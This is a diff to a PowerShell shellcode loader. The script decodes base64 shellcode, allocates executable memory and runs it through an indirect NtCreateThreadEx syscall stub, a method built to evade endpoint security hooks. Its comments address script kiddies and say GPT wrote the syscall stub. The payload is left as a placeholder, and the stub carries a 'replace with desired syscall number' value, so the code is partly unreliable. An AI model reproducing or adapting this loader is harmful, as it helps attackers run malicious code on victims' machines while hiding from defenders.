@@ -29,10 +29,10 @@ public class Syscall
     public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
 }
 "@
-
 Add-Type -TypeDefinition $IndirectSyscall -PassThru
 
-$shellcode = [System.Convert]::FromBase64String("Encoded Shellcode Shit here (payload)")
+# so ur shellcode payload (little confusing for skids ik)
+$shellcode = [System.Convert]::FromBase64String("B64 Shellcode")
 
 $size = $shellcode.Length
 $ptr = [Syscall]::VirtualAlloc([IntPtr]::Zero, $size, 0x3000, 0x40)
@@ -41,7 +41,7 @@ $ptr = [Syscall]::VirtualAlloc([IntPtr]::Zero, $size, 0x3000, 0x40)
 $ntdll = [Syscall]::GetModuleHandle("ntdll.dll")
 $syscallAddress = [Syscall]::GetProcAddress($ntdll, "NtCreateThreadEx")
 
-# i used gpt for this part because i got really stuck (lmao sorry guys)
+# GPT USED IN THIS BIT LOL
 $syscallStub = @(
     0x4C, 0x8B, 0xD1,                 # mov r10, rcx
     0xB8, 0x55, 0x00, 0x00, 0x00,     # mov eax, 0x55 (Replace 0x55 with desired syscall number)
@@ -50,3 +50,4 @@ $syscallStub = @(
 )
 
 [Syscall]::InvokeSyscall($syscallStub, $syscallAddress, $ptr, $size)
+Write-Host "[+] Shellcode Executed via Indirect Syscall."
